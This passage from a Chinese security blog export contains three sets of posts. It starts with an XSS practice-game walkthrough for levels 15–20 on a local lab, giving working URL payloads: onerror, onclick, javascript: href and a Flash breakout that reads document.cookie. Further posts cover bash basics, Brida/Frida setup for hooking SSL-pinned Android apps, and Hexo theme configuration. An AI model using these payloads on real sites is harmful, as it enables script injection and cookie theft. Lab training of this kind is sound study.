<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/xss练习小游戏/</span>level15.php?src=<span class="string">&#x27;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131143639.png"></p>
<h2 id="LEVEL-16"><a href="#LEVEL-16" class="headerlink" title="LEVEL-16"></a>LEVEL-16</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131144140.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131151035.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss%E<span class="number">7</span>%BB%<span class="number">83</span>%E<span class="number">4</span>%B<span class="number">9</span>%A<span class="number">0</span>%E<span class="number">5</span>%B<span class="number">0</span>%<span class="number">8</span>F%E<span class="number">6</span>%B<span class="number">8</span>%B<span class="number">8</span>%E<span class="number">6</span>%<span class="number">88</span>%<span class="number">8</span>F/level<span class="number">16</span>.php?keyword=%<span class="number">3</span>Cimg%<span class="number">0</span>dsrc=<span class="number">1</span>%<span class="number">0</span>donerror=alert()%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131151324.png"></p>
<h2 id="LEVEL-17"><a href="#LEVEL-17" class="headerlink" title="LEVEL-17"></a>LEVEL-17</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131153317.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131152449.png"></p>
<p>过滤了尖括号和双引号，用on事件触发<br><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss练习小游戏/level<span class="number">17</span>.php?arg<span class="number">01</span>=a&amp;arg<span class="number">02</span>=b%<span class="number">20</span>onclick=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131153857.png"></p>
<h2 id="LEVEL-18"><a href="#LEVEL-18" class="headerlink" title="LEVEL-18"></a>LEVEL-18</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131154055.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131154320.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss练习小游戏/level<span class="number">18</span>.php?arg<span class="number">01</span>=a&amp;arg<span class="number">02</span>=%<span class="number">20</span>onclick=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131154812.png"></p>
<h2 id="LEVEL-19"><a href="#LEVEL-19" class="headerlink" title="LEVEL-19"></a>LEVEL-19</h2><p>19,20均为flash分析<br>需要<img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131155823.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131154950.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131155058.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss练习小游戏/level<span class="number">19</span>.php?arg<span class="number">01</span>=version&amp;arg<span class="number">02</span>=%<span class="number">3</span>Ca%<span class="number">20</span>href=%<span class="number">22</span>javascript:alert(document.domain)%<span class="number">22</span>%<span class="number">3</span>Exss_by_SST%<span class="number">3</span>C/a%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131155314.png"></p>
<h2 id="LEVEL-20"><a href="#LEVEL-20" class="headerlink" title="LEVEL-20"></a>LEVEL-20</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131155440.png"><br>具体可以参考<a href="https://www.freebuf.com/sectool/108568.html">freebuf</a><br>确实很少碰到，算flash中xss少的了</p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss练习小游戏/level<span class="number">20</span>.php?arg<span class="number">01</span>=id&amp;arg<span class="number">02</span>=\%<span class="number">22</span>))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%<span class="number">26</span>width%<span class="number">26</span>height</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>bash脚本入门————变量</title>
    <url>/2019/12/17/bash%E8%84%9A%E6%9C%AC%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是一个简易的bash入门<br>适合小白白学习</p>
<a id="more"></a>

<hr>
<h2 id="bash模式"><a href="#bash模式" class="headerlink" title="bash模式"></a>bash模式</h2><p>bash是shell解释器程序</p>
<blockquote>
<p>bash shell 有交互和非交互两种模式</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">形如下面的东西，说明shell处于交互模式下：</span><br><span class="line"></span><br><span class="line">user@host:~$                             <span class="comment">#shell直接与用户交互</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">在非交互模式下，shell从文件或者管道中读取命令并执行。</span><br><span class="line"></span><br><span class="line">sh /path/to/script.sh</span><br><span class="line">bash /path/to/script.sh</span><br><span class="line">source /path/to/script.sh</span><br></pre></td></tr></table></figure>
<h2 id="常见bash命令"><a href="#常见bash命令" class="headerlink" title="常见bash命令"></a>常见bash命令</h2><h3 id="1-变量赋值"><a href="#1-变量赋值" class="headerlink" title="1. 变量赋值"></a>1. 变量赋值</h3><ul>
<li>单引号 ‘’</li>
<li>双引号 “”</li>
<li>花括号 {}</li>
<li>圆括号 ()</li>
<li>反引号 ``</li>
</ul>
<p>简单的变量赋值：</p>
<p>bash和C类似，同样用赋值符号”=”来表示赋值，比如</p>
<p>$var=world<br>复杂的变量赋值：<br>单引号赋值：单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</p>
<p>子shell和当前shell<br>子shell 生成一个新的shell<br>当前shell shell在当前执行。 source/ .  </p>
<hr>
<p>//查看脚本语法是否有错误：</p>
<p>//bash -n modify_suffix.sh</p>
<p>//跟踪执行</p>
<p>//sh -x modify_suffix.sh aaa</p>
]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title>brida从0配置</title>
    <url>/2020/06/11/brida%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>APP测试做到后面一定绕不开hook。虽然目前很多的APP还有做证书校验，加固混淆，但仍需负重前行。</p>
<a id="more"></a>

<hr>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为最近测的一个app，做了ssl pinning。查了一下资料，可以使用frida从内存中hook<br>住加密函数，用来解密传输信息。而brida是连接frida与burp的桥梁。使用了brida就可以正常使用burp抓取加密数据包。而网上关于brida的安装环境都不是最新的。brida原本默认是py2的，现在0.4版本已经支持py3的环境。接下来，我就带大家从0开始安装环境吧。</p>
<h1 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h1><ul>
<li>系统 win10</li>
<li>python 3.8.3</li>
<li>java 13</li>
<li>夜神模拟器 android版本7.0</li>
<li>burp 2020.5 crack</li>
<li>node 14.4.0 </li>
</ul>
<p>基本上是一个全新的环境。adb，frida也都没有配置。问题不大。</p>
<h1 id="设置与准备"><a href="#设置与准备" class="headerlink" title="设置与准备"></a>设置与准备</h1><h2 id="1-brida下载安装"><a href="#1-brida下载安装" class="headerlink" title="1.brida下载安装"></a>1.brida下载安装</h2><p>github上的<a href="https://github.com/federicodotta/Brida/releases">release</a></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%40DGT%24OL(GRDK7D)71BNHO%7DB.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/233333333221.png" alt="安装完成"></p>
<p>此时两个status还未启动起来，那需要我们去配置frida的环境了。</p>
<p>或者burpsuite中BAPP store安装<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611102150.png"></p>
<h2 id="2-adb设置"><a href="#2-adb设置" class="headerlink" title="2.adb设置"></a>2.adb设置</h2><p>adb是连接模拟器和电脑的桥梁</p>
<p>adb的版本需要和nox的版本一致。我们可以直接使用everything去查找nox的adb，然后配置环境变量即可。</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611102150.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/DWEEDWDEW.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/wyijsandd1212sa12.png" alt="出现下面即可证明完成设置"></p>
<h2 id="frida设置"><a href="#frida设置" class="headerlink" title="frida设置"></a>frida设置</h2><p>frida分为server和client</p>
<h3 id="客户端安装frida"><a href="#客户端安装frida" class="headerlink" title="客户端安装frida"></a>客户端安装frida</h3><p>这一步比较容易，pip安装即可</p>
<p>我们可以设置pip国内源来加快安装</p>
<p>1.进入c盘用户文件夹，新建pip的目录。pip目录下新建pip.ini的文件。</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611104024.png"></p>
<p>2.在pip.ini中添加下面代码：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">timeout=<span class="number">6000</span></span><br><span class="line"><span class="keyword">index</span>-url=https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"><span class="keyword">trusted</span>-host=pypi.tuna.tsinghua.edu.cn</span><br><span class="line"></span><br><span class="line"># pip源同样适用python3和python2。(适用python2的firda下载包时可能会出现卡死，可以试试这个方法改善)</span><br></pre></td></tr></table></figure>
<h4 id="安装第三方库"><a href="#安装第三方库" class="headerlink" title="安装第三方库"></a>安装第三方库</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pip install Pyro4</span><br><span class="line">pip install frida-tools</span><br><span class="line">npm install frida-compile <span class="comment">#这个生成frida-conpile.cmd.burpsuite中需要填写frida compile path</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611105925.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%25K%60L0_V6ZH7FC1ZE.png"></p>
<h3 id="服务端安装frida"><a href="#服务端安装frida" class="headerlink" title="服务端安装frida"></a>服务端安装frida</h3><ol>
<li>查看模拟器cpu版本<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">getprop</span> <span class="selector-tag">ro</span><span class="selector-class">.product</span><span class="selector-class">.cpu</span><span class="selector-class">.abi</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611111536.png"></p>
<p>根据cpu版本选择<a href="https://github.com/frida/frida/releases">frida-server</a><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611114447.png"></p>
<p>将下载好的文件解压并放入/data/local/tmp 模拟器中。在adb 进入模拟器，文件赋值777后启动server</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">adb push C:\Users\howti\Desktop\frida-server<span class="number">-12.9</span><span class="number">.7</span>-android-x86 /data/local/tmp</span><br><span class="line">adb shell</span><br><span class="line">cd /data/local/tmp/</span><br><span class="line">chmod  <span class="number">777</span> frida-server<span class="number">-12.9</span><span class="number">.7</span>-android-x86</span><br><span class="line">./frida-server<span class="number">-12.9</span><span class="number">.7</span>-android-x86</span><br></pre></td></tr></table></figure>
<p>android版本最好使用android7，不然会一些报错。</p>
<p>什么都不显示即可<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/dewjdkew.png"></p>
<p>将frida端口转发</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">adb forward tcp:<span class="number">27042</span> tcp:<span class="number">27042</span></span><br><span class="line">adb forward tcp:<span class="number">27043</span> tcp:<span class="number">27043</span></span><br></pre></td></tr></table></figure>

<h2 id="burp设置"><a href="#burp设置" class="headerlink" title="burp设置"></a>burp设置</h2><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200611120252.png"></p>
<h4 id="设置brida"><a href="#设置brida" class="headerlink" title="设置brida"></a>设置brida</h4><ul>
<li>Python binary path: 就填入python3的路径（使用brida0.4就可以支持py3）</li>
<li>Pyro host: 默认 </li>
<li>Pyro port: 默认 </li>
<li>frida-compile: (frida-compile的二进制文件的路径)之前npm安装的包,里面有frida-compile.cmd .使用everything搜索frida 然后填入.</li>
<li>Frida JS files folder: 包含带有所有Frida和Brida钩子和导出文件的Frida工具JavaScript文件的文件夹的路径。我们可以使用默认文件夹</li>
</ul>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/burp1frida.png"></p>
]]></content>
  </entry>
  <entry>
    <title>主题美化</title>
    <url>/2019/09/27/hexo%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>hexo3的版本</li>
<li>next7的版本</li>
<li>部署好github</li>
</ul>
<a id="more"></a>

<hr>
<h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><h4 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">-<span class="symbol">theme:</span> landscape</span><br><span class="line">+<span class="symbol">theme:</span> <span class="keyword">next</span></span><br></pre></td></tr></table></figure>

<h4 id="站点信息"><a href="#站点信息" class="headerlink" title="站点信息"></a>站点信息</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="symbol">title:</span> Alpha的小站</span><br><span class="line"><span class="symbol">subtitle:</span> 一个自觉还有很多路要走的孩子，想做的更好。</span><br><span class="line"><span class="symbol">description:</span> 够努力才会越幸运</span><br><span class="line"><span class="symbol">keywords:</span> Linux,CTF,漏洞复现,环境搭建,工具使用</span><br><span class="line"><span class="symbol">author:</span> wang</span><br><span class="line"><span class="symbol">language:</span> zh-CN</span><br><span class="line"><span class="symbol">timezone:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line">  <span class="symbol">type:</span> git</span><br><span class="line">  <span class="symbol">repo:</span> git@github.<span class="symbol">com:</span>alpha302/alpha302.github.io.git</span><br><span class="line">  <span class="symbol">branch:</span> master </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">favicon:</span></span><br><span class="line">  <span class="symbol">small:</span> /images/favicon.ico</span><br><span class="line">  <span class="symbol">medium:</span> /images/favicon.ico</span><br><span class="line">  <span class="symbol">apple_touch_icon:</span> /favicon.ico</span><br><span class="line">  <span class="symbol">safari_pinned_tab:</span> /favicon.ico</span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
<h4 id="知识共享"><a href="#知识共享" class="headerlink" title="知识共享"></a>知识共享</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">creative_commons:</span></span><br><span class="line">  <span class="symbol">license:</span> by-nc-sa</span><br><span class="line">  <span class="symbol">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">language:</span> zh-CN</span><br></pre></td></tr></table></figure>

<h4 id="goole站点"><a href="#goole站点" class="headerlink" title="goole站点"></a>goole站点</h4><p>登陆<a href="%22https://www.google.com/webmasters/%22">goole网站站长</a>,在“网址前缀”栏输入你的博客网址。验证所有权选择HTML标记，将content=”x7LMhrHG*<strong><strong><strong><strong>****</strong></strong></strong></strong>“复制到主题配置文件.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">google_site_verification:</span> x7LMhrHG****************</span><br></pre></td></tr></table></figure>
<h4 id="侧栏图标"><a href="#侧栏图标" class="headerlink" title="侧栏图标"></a>侧栏图标</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line">  <span class="symbol">home:</span> / <span class="params">||</span> home</span><br><span class="line">  <span class="symbol">categories:</span> /categories/ <span class="params">||</span> th</span><br><span class="line">  <span class="symbol">tags:</span> /tags/ <span class="params">||</span> tags</span><br><span class="line">  <span class="symbol">archives:</span> /archives/ <span class="params">||</span> archive</span><br><span class="line">  <span class="symbol">about:</span> /about/ <span class="params">||</span> user</span><br></pre></td></tr></table></figure>

<h4 id="侧栏数目"><a href="#侧栏数目" class="headerlink" title="侧栏数目"></a>侧栏数目</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu_settings:</span></span><br><span class="line">  <span class="symbol">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">badges:</span> <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="主题风格"><a href="#主题风格" class="headerlink" title="主题风格"></a>主题风格</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">##scheme: Mist</span></span><br><span class="line"><span class="symbol">scheme:</span> Pisces</span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
<h4 id="移除next页脚"><a href="#移除next页脚" class="headerlink" title="移除next页脚"></a>移除next页脚</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">powered:</span></span><br><span class="line">  <span class="comment"># Hexo link (Powered by Hexo).</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Version info of Hexo after Hexo link (vX.X.X).</span></span><br><span class="line">  <span class="symbol">version:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">theme:</span></span><br><span class="line">  <span class="comment"># Theme &amp; scheme info link (Theme - NexT.scheme).</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Version info of NexT after scheme info (vX.X.X).</span></span><br><span class="line">  <span class="symbol">version:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line"><span class="comment">#### 图标链接</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`ruby</span></span><br><span class="line"><span class="string">social:</span></span><br><span class="line"><span class="string">  GitHub: https://github.com/alpha302/alpha302.github.io.git || github</span></span><br><span class="line"><span class="string">  E-Mail: mailto:howtime4096@gmail.com || envelope</span></span><br><span class="line"><span class="string">  Telegram: https://t.me/howtime4096  || telegram</span></span><br></pre></td></tr></table></figure>
<h4 id="大头像"><a href="#大头像" class="headerlink" title="大头像"></a>大头像</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">avatar:</span></span><br><span class="line">  <span class="comment"># In theme directory (source/images): /images/avatar.gif</span></span><br><span class="line">  <span class="comment"># In site directory (source/uploads): /uploads/avatar.gif</span></span><br><span class="line">  <span class="comment"># You can also use other linking images.</span></span><br><span class="line">  <span class="symbol">url:</span> /images/headicon.png</span><br><span class="line">  <span class="comment"># 圆角头像</span></span><br><span class="line">  <span class="symbol">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># 不透明度</span></span><br><span class="line">  <span class="symbol">opacity:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># 鼠标指示旋转头像</span></span><br><span class="line">  <span class="symbol">rotated:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h4 id="收起文章详情"><a href="#收起文章详情" class="headerlink" title="收起文章详情"></a>收起文章详情</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">auto_excerpt:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">length:</span> <span class="number">150</span></span><br></pre></td></tr></table></figure>
<h4 id="文章统计，文字阅读时长"><a href="#文章统计，文字阅读时长" class="headerlink" title="文章统计，文字阅读时长"></a>文章统计，文字阅读时长</h4><p>3步</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-symbols-<span class="keyword">count</span>-<span class="built_in">time</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings                        主题配置文件</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span></span><br><span class="line"><span class="symbol">symbols_count_time:</span></span><br><span class="line">  <span class="symbol">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">item_text_total:</span> <span class="literal">false</span></span><br><span class="line">  <span class="symbol">awl:</span> <span class="number">4</span></span><br><span class="line">  <span class="symbol">wpm:</span> <span class="number">275</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">symbols_count_time:</span></span><br><span class="line">  <span class="symbol">symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">time:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">total_symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">total_time:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">codeblock:</span></span><br><span class="line">  <span class="comment"># Code Highlight theme</span></span><br><span class="line">  <span class="comment"># Available values: normal | night | night eighties | night blue | night bright</span></span><br><span class="line">  <span class="comment"># See: https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line">  <span class="symbol">highlight_theme:</span> normal</span><br><span class="line">  <span class="comment"># Add copy button on codeblock</span></span><br><span class="line">  <span class="symbol">copy_button:</span></span><br><span class="line">    <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Show text copy result.</span></span><br><span class="line">    <span class="symbol">show_result:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Available values: default | flat | mac</span></span><br><span class="line">    <span class="symbol">style:</span> mac</span><br></pre></td></tr></table></figure>
<h4 id="back2top"><a href="#back2top" class="headerlink" title="back2top"></a>back2top</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">back2top:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="symbol">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="symbol">scrollpercent:</span> <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="bookmark"><a href="#bookmark" class="headerlink" title="bookmark"></a>bookmark</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">bookmark:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Customize the color of the bookmark.</span></span><br><span class="line">  <span class="symbol">color:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="comment"># If auto, save the reading progress when closing the page or clicking the bookmark-icon.</span></span><br><span class="line">  <span class="comment"># If manual, only save it by clicking the bookmark-icon.</span></span><br><span class="line">  <span class="symbol">save:</span> auto</span><br></pre></td></tr></table></figure>
<h4 id="第三方插件"><a href="#第三方插件" class="headerlink" title="第三方插件"></a>第三方插件</h4><h5 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h5><p>在github上申请一个oAuth Apps 获取github_id和secret。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">gitalk:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">github_id:</span> alpha302 <span class="comment"># Github repo owner</span></span><br><span class="line">  <span class="symbol">repo:</span> gitment-comments  <span class="comment"># Repository name to store issues</span></span><br><span class="line">  <span class="symbol">client_id:</span> xxxxx <span class="comment"># Github Application Client ID</span></span><br><span class="line">  <span class="symbol">client_secret:</span> xxxxxx <span class="comment"># Github Application Client Secret</span></span><br><span class="line">  <span class="symbol">admin_user:</span> alpha302 <span class="comment"># GitHub repo owner and collaborators, only these guys can initialize gitHub issues</span></span><br><span class="line">  <span class="symbol">distraction_free_mode:</span> <span class="literal">true</span> <span class="comment"># Facebook-like distraction free mode</span></span><br><span class="line">  <span class="comment"># Gitalk&#x27;s display language depends on user&#x27;s browser or system environment</span></span><br><span class="line">  <span class="comment"># If you want everyone visiting your site to see a uniform language, you can set a force language value</span></span><br><span class="line">  <span class="comment"># Available values: en | es-ES | fr | ru | zh-CN | zh-TW</span></span><br><span class="line">  <span class="symbol">language:</span> zh-CN</span><br></pre></td></tr></table></figure>
<h5 id="不算子访客统计"><a href="#不算子访客统计" class="headerlink" title="不算子访客统计"></a>不算子访客统计</h5><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访客人数统计</span></span><br><span class="line"><span class="symbol">busuanzi_count:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">total_visitors_icon:</span> user</span><br><span class="line">  <span class="symbol">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">total_views_icon:</span> eye</span><br><span class="line">  <span class="symbol">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">post_views_icon:</span> eye</span><br></pre></td></tr></table></figure>
<h5 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h5><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">local_search:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="symbol">trigger:</span> auto</span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="symbol">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="symbol">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="symbol">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h5 id="动态文章背景"><a href="#动态文章背景" class="headerlink" title="动态文章背景"></a>动态文章背景</h5><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/theme</span>-<span class="keyword">next</span>/theme-<span class="keyword">next</span>-three source/<span class="class"><span class="keyword">lib</span>/<span class="title">three</span></span></span><br><span class="line"><span class="comment"># JavaScript 3D library.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-three</span></span><br><span class="line"><span class="symbol">three:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">delay:</span> <span class="literal">false</span> <span class="comment"># Set true to further delay loading</span></span><br><span class="line">  <span class="symbol">three_waves:</span> <span class="literal">false</span></span><br><span class="line">  <span class="symbol">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line">  <span class="symbol">canvas_sphere:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
